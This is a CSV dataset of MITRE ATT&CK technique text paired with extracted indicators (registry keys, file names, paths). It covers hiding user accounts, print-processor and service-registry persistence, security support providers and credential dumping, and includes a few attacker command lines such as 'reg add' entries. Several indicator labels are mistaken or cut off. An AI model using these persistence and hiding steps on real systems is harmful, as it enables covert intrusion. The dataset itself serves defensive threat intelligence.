tech_id,tech_name,text,section,ioc,ioc_value
T1564.002,Hidden Users,"Adversaries may use hidden users to hide the presence of user accounts they create or modify. Administrators may want to hide users when there are many user accounts on a given system or if they want to hide their administrative or other management accounts from other users.    In macOS, adversaries can create or modify a user to be hidden through manipulating plist files, folder attributes, and user attributes. To prevent a user from being shown on the login screen and in System Preferences, adversaries can set the userID to be under 500 and set the key value  Hide500Users  to  TRUE  in the  /Library/Preferences/com.apple.loginwindow  plist file.   [1]    Every user has a userID associated with it. When the  Hide500Users  key value is set to  TRUE , users with a userID under 500 do not appear on the login screen and in System Preferences. Using the command line, adversaries can use the  dscl  utility to create hidden user accounts by setting the  IsHidden  attribute to  1 . Adversaries can also hide a user’s home folder by changing the  chflags  to hidden.   [2]       Adversaries may similarly hide user accounts in Windows. Adversaries can set the  HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList  Registry key value to  0  for a specific user to prevent that user from being listed on the logon screen.   [3]      [4]      On Linux systems, adversaries may hide user accounts from the login screen, also referred to as the greeter. The method an adversary may use depends on which Display Manager the distribution is currently using. For example, on an Ubuntu system using the GNOME Display Manger (GDM), accounts may be hidden from the greeter using the  gsettings  command (ex:  sudo -u gdm gsettings set org.gnome.login-screen disable-user-list true ).   [5]    Display Managers are not anchored to specific distributions and may be changed by a user or adversary.",Description,registry-key,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList
T1564.002,Hidden Users,"Adversaries may use hidden users to hide the presence of user accounts they create or modify. Administrators may want to hide users when there are many user accounts on a given system or if they want to hide their administrative or other management accounts from other users.    In macOS, adversaries can create or modify a user to be hidden through manipulating plist files, folder attributes, and user attributes. To prevent a user from being shown on the login screen and in System Preferences, adversaries can set the userID to be under 500 and set the key value  Hide500Users  to  TRUE  in the  /Library/Preferences/com.apple.loginwindow  plist file.   [1]    Every user has a userID associated with it. When the  Hide500Users  key value is set to  TRUE , users with a userID under 500 do not appear on the login screen and in System Preferences. Using the command line, adversaries can use the  dscl  utility to create hidden user accounts by setting the  IsHidden  attribute to  1 . Adversaries can also hide a user’s home folder by changing the  chflags  to hidden.   [2]       Adversaries may similarly hide user accounts in Windows. Adversaries can set the  HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList  Registry key value to  0  for a specific user to prevent that user from being listed on the logon screen.   [3]      [4]      On Linux systems, adversaries may hide user accounts from the login screen, also referred to as the greeter. The method an adversary may use depends on which Display Manager the distribution is currently using. For example, on an Ubuntu system using the GNOME Display Manger (GDM), accounts may be hidden from the greeter using the  gsettings  command (ex:  sudo -u gdm gsettings set org.gnome.login-screen disable-user-list true ).   [5]    Display Managers are not anchored to specific distributions and may be changed by a user or adversary.",Description,path,/Library/Preferences/com.apple
T1564.002,Hidden Users,"Adversaries may use hidden users to hide the presence of user accounts they create or modify. Administrators may want to hide users when there are many user accounts on a given system or if they want to hide their administrative or other management accounts from other users.    In macOS, adversaries can create or modify a user to be hidden through manipulating plist files, folder attributes, and user attributes. To prevent a user from being shown on the login screen and in System Preferences, adversaries can set the userID to be under 500 and set the key value  Hide500Users  to  TRUE  in the  /Library/Preferences/com.apple.loginwindow  plist file.   [1]    Every user has a userID associated with it. When the  Hide500Users  key value is set to  TRUE , users with a userID under 500 do not appear on the login screen and in System Preferences. Using the command line, adversaries can use the  dscl  utility to create hidden user accounts by setting the  IsHidden  attribute to  1 . Adversaries can also hide a user’s home folder by changing the  chflags  to hidden.   [2]       Adversaries may similarly hide user accounts in Windows. Adversaries can set the  HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList  Registry key value to  0  for a specific user to prevent that user from being listed on the logon screen.   [3]      [4]      On Linux systems, adversaries may hide user accounts from the login screen, also referred to as the greeter. The method an adversary may use depends on which Display Manager the distribution is currently using. For example, on an Ubuntu system using the GNOME Display Manger (GDM), accounts may be hidden from the greeter using the  gsettings  command (ex:  sudo -u gdm gsettings set org.gnome.login-screen disable-user-list true ).   [5]    Display Managers are not anchored to specific distributions and may be changed by a user or adversary.",Description,registry-key,HKLM\SOFTWARE\Microsoft\Windows
T1564.002,Hidden Users,Kimsuky  has run  reg add ‘HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList’ /v  to hide a newly created user.   [6],Procedure Examples,registry-key,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList
T1564.002,Hidden Users,Kimsuky  has run  reg add ‘HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList’ /v  to hide a newly created user.   [6],Procedure Examples,registry-key,HKLM\SOFTWARE\Microsoft\Windows
T1480,Execution Guardrails,NativeZone  can check for the presence of KM.EkeyAlmaz1C.dll and will halt execution unless it is in the same directory as the rest of the malware's components.   [5]      [6],Procedure Examples,file,KM.EkeyAlmaz1C.dll
T1098.002,Additional Email Delegate Permissions,"APT29  added their own devices as allowed IDs for active sync using  Set-CASMailbox , allowing it to obtain copies of victim mailboxes. It also added additional permissions (such as Mail.Read and Mail.ReadWrite) to compromised Application or Service Principals.   [9]      [10]      [11]",Procedure Examples,domain,mail.read
T1547.012,Print Processors,"Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, spoolsv.exe, during boot.    Adversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the  AddPrintProcessor  API call with an account that has  SeLoadDriverPrivilege  enabled. Alternatively, a print processor can be registered to the print spooler service by adding the  HKLM\SYSTEM\[CurrentControlSet or ControlSet001]\Control\Print\Environments\[Windows architecture: e.g., Windows x64]\Print Processors\[user defined]\Driver  Registry key that points to the DLL. For the print processor to be correctly installed, it must be located in the system print-processor directory that can be found with the  GetPrintProcessorDirectory  API call.   [1]    After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run.   [2]    The print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.",Description,registry-key,HKLM\SYSTEM
T1547.012,Print Processors,"Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, spoolsv.exe, during boot.    Adversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the  AddPrintProcessor  API call with an account that has  SeLoadDriverPrivilege  enabled. Alternatively, a print processor can be registered to the print spooler service by adding the  HKLM\SYSTEM\[CurrentControlSet or ControlSet001]\Control\Print\Environments\[Windows architecture: e.g., Windows x64]\Print Processors\[user defined]\Driver  Registry key that points to the DLL. For the print processor to be correctly installed, it must be located in the system print-processor directory that can be found with the  GetPrintProcessorDirectory  API call.   [1]    After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run.   [2]    The print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.",Description,file,spoolsv.exe
T1547.012,Print Processors,"Earth Lusca  has added the Registry key  HKLM\SYSTEM\ControlSet001\Control\Print\Environments\Windows x64\Print Processors\UDPrint"" /v Driver /d ""spool.dll /f  to load malware as a Print Processor.   [3]",Procedure Examples,registry-key,HKLM\SYSTEM\ControlSet001\Control\Print\Environments\Windows x64\Print Processors\UDPrint
T1547.012,Print Processors,"Earth Lusca  has added the Registry key  HKLM\SYSTEM\ControlSet001\Control\Print\Environments\Windows x64\Print Processors\UDPrint"" /v Driver /d ""spool.dll /f  to load malware as a Print Processor.   [3]",Procedure Examples,path,"/v Driver /d ""spool.dll"
T1547.012,Print Processors,"Earth Lusca  has added the Registry key  HKLM\SYSTEM\ControlSet001\Control\Print\Environments\Windows x64\Print Processors\UDPrint"" /v Driver /d ""spool.dll /f  to load malware as a Print Processor.   [3]",Procedure Examples,registry-key,HKLM\SYSTEM\ControlSet001\Control\Print\Environments\Windows
T1547.012,Print Processors,"Earth Lusca  has added the Registry key  HKLM\SYSTEM\ControlSet001\Control\Print\Environments\Windows x64\Print Processors\UDPrint"" /v Driver /d ""spool.dll /f  to load malware as a Print Processor.   [3]",Procedure Examples,file,spool.dll
T1547.012,Print Processors,Gelsemium  can drop itself in  C:\Windows\System32\spool\prtprocs\x64\winprint.dll  to be loaded automatically by the spoolsv Windows service.   [4],Procedure Examples,path,C:\Windows\System32\spool\prtprocs\x64\winprint.dll
T1547.012,Print Processors,Gelsemium  can drop itself in  C:\Windows\System32\spool\prtprocs\x64\winprint.dll  to be loaded automatically by the spoolsv Windows service.   [4],Procedure Examples,file,winprint.dll
T1547.012,Print Processors,The  PipeMon  installer has modified the Registry key  HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors  to install  PipeMon  as a Print Processor.   [2],Procedure Examples,registry-key,HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print
T1547.012,Print Processors,The  PipeMon  installer has modified the Registry key  HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors  to install  PipeMon  as a Print Processor.   [2],Procedure Examples,registry-key,HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows
T1567.001,Exfiltration to Code Repository,"Adversaries may exfiltrate data to a code repository rather than over their primary command and control channel. Code repositories are often accessible via an API (ex: https://api.github.com). Access to these APIs are often over HTTPS, which gives the adversary an additional level of protection.   Exfiltration to a code repository can also provide a significant amount of cover to the adversary if it is a popular service already used by hosts within the network.",Description,url,https://api.github.com
T1567.001,Exfiltration to Code Repository,"Adversaries may exfiltrate data to a code repository rather than over their primary command and control channel. Code repositories are often accessible via an API (ex: https://api.github.com). Access to these APIs are often over HTTPS, which gives the adversary an additional level of protection.   Exfiltration to a code repository can also provide a significant amount of cover to the adversary if it is a popular service already used by hosts within the network.",Description,domain,api.github.com
T1027.003,Steganography,MuddyWater  has stored obfuscated JavaScript code in an image file named temp.jpg.   [15],Procedure Examples,file,temp.jpg
T1003.005,Cached Domain Credentials,"Adversaries may attempt to access cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable.   [1]      On Windows Vista and newer, the hash format is DCC2 (Domain Cached Credentials version 2) hash, also known as MS-Cache v2 hash.   [2]    The number of default cached credentials varies and can be altered per system. This hash does not allow pass-the-hash style attacks, and instead requires  Password Cracking  to recover the plaintext password.   [3]      With SYSTEM access, the tools/utilities such as  Mimikatz ,  Reg , and secretsdump.py can be used to extract the cached credentials.   Note: Cached credentials for Windows Vista are derived using PBKDF2.   [2]",Description,domain,secretsdump.py
T1574.011,Services Registry Permissions Weakness,"Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under  HKLM\SYSTEM\CurrentControlSet\Services . The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,   PowerShell , or  Reg . Access to Registry keys is controlled through access control lists and user permissions.    [1]      [2]      If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).   Adversaries may also alter other Registry keys in the service’s Registry tree. For example, the  FailureCommand  key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.   [3]      [4]      The  Performance  key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.   [5]    If the  Performance  key is not already present and if an adversary-controlled user has the  Create Subkey  permission, adversaries may create the  Performance  key in the service’s Registry tree to point to a malicious DLL.   [6]      Adversaries may also add the  Parameters  key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities.   [5]      [7]    Additionally, If adversaries launch their malicious services using svchost.exe, the service’s file may be identified using  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\servicename\Parameters\ServiceDll .   [2]",Description,registry-key,HKLM\SYSTEM\CurrentControlSet\Services
T1574.011,Services Registry Permissions Weakness,"Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under  HKLM\SYSTEM\CurrentControlSet\Services . The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,   PowerShell , or  Reg . Access to Registry keys is controlled through access control lists and user permissions.    [1]      [2]      If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).   Adversaries may also alter other Registry keys in the service’s Registry tree. For example, the  FailureCommand  key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.   [3]      [4]      The  Performance  key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.   [5]    If the  Performance  key is not already present and if an adversary-controlled user has the  Create Subkey  permission, adversaries may create the  Performance  key in the service’s Registry tree to point to a malicious DLL.   [6]      Adversaries may also add the  Parameters  key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities.   [5]      [7]    Additionally, If adversaries launch their malicious services using svchost.exe, the service’s file may be identified using  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\servicename\Parameters\ServiceDll .   [2]",Description,file,sc.exe
T1574.011,Services Registry Permissions Weakness,"Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under  HKLM\SYSTEM\CurrentControlSet\Services . The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,   PowerShell , or  Reg . Access to Registry keys is controlled through access control lists and user permissions.    [1]      [2]      If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).   Adversaries may also alter other Registry keys in the service’s Registry tree. For example, the  FailureCommand  key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.   [3]      [4]      The  Performance  key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.   [5]    If the  Performance  key is not already present and if an adversary-controlled user has the  Create Subkey  permission, adversaries may create the  Performance  key in the service’s Registry tree to point to a malicious DLL.   [6]      Adversaries may also add the  Parameters  key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities.   [5]      [7]    Additionally, If adversaries launch their malicious services using svchost.exe, the service’s file may be identified using  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\servicename\Parameters\ServiceDll .   [2]",Description,file,svchost.exe
T1574.011,Services Registry Permissions Weakness,"During  Operation Honeybee , the threat actors used a batch file that modified the COMSysApp service to load a malicious ipnet.dll payload and to load a DLL into the  svchost.exe  process.   [8]",Procedure Examples,file,ipnet.dll
T1574.011,Services Registry Permissions Weakness,"During  Operation Honeybee , the threat actors used a batch file that modified the COMSysApp service to load a malicious ipnet.dll payload and to load a DLL into the  svchost.exe  process.   [8]",Procedure Examples,file,svchost.exe
T1547.005,Security Support Provider,"Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.   The SSP configuration is stored in two Registry keys:  HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages  and  HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages . An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.   [1]",Description,registry-key,HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages  and  HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security
T1547.005,Security Support Provider,"Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.   The SSP configuration is stored in two Registry keys:  HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages  and  HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages . An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.   [1]",Description,registry-key,HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security
